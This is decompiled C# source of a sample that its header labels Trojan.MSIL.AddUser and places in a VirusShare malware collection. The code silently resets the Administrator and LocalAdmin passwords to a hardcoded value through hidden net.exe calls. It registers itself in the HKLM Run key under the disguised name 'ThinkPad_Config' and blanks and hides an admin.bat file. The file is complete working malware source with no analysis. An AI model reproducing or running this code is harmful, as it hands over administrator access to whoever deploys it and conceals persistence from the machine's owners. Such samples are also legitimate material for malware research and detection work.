// Decompiled with JetBrains decompiler
// Type: tpconfig.main
// Assembly: tpconfig, Version=1.0.2284.23405, Culture=neutral, PublicKeyToken=null
// MVID: 590F4D3B-E941-4083-A915-CBDA17F2D607
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Trojan.MSIL.AddUser-5cea7a8e3574f4ec55310a847d631ae4032ca6ff6572a241f328ca5cbb9bf13a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace tpconfig
{
  [StandardModule]
  internal sealed class main
  {
    [STAThread]
    public static void Main()
    {
      if (File.Exists("c:\\windows\\system32\\net.exe"))
      {
        Interaction.Shell("c:\\windows\\system32\\net.exe user Administrator TheonlywinningmoveisnottoplaY", AppWinStyle.Hide, true);
        Interaction.Shell("c:\\windows\\system32\\net.exe user LocalAdmin TheonlywinningmoveisnottoplaY", AppWinStyle.Hide, true);
        try
        {
          RegistryKey subKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
          subKey.SetValue("ThinkPad_Config", (object) "c:\\windows\\system32\\tpconfig.exe");
          subKey.Close();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else
      {
        int num = (int) MessageBox.Show("Error: Please contact the DE&T Service Desk on 1800 641 943", "Error: File", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      }
      if (!File.Exists("c:\\windows\\ihome\\admin.bat"))
        return;
      try
      {
        File.SetAttributes("c:\\windows\\ihome\\admin.bat", FileAttributes.Normal);
        File.Delete("c:\\windows\\ihome\\admin.bat");
        StreamWriter streamWriter = new StreamWriter("c:\\windows\\ihome\\admin.bat");
        streamWriter.WriteLine("REM This file is blank");
        streamWriter.Close();
        Thread.Sleep(2000);
        File.SetAttributes("c:\\windows\\ihome\\admin.bat", FileAttributes.Normal);
        File.SetAttributes("c:\\windows\\ihome\\admin.bat", FileAttributes.Hidden);
        File.SetAttributes("c:\\windows\\ihome\\admin.bat", FileAttributes.ReadOnly);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
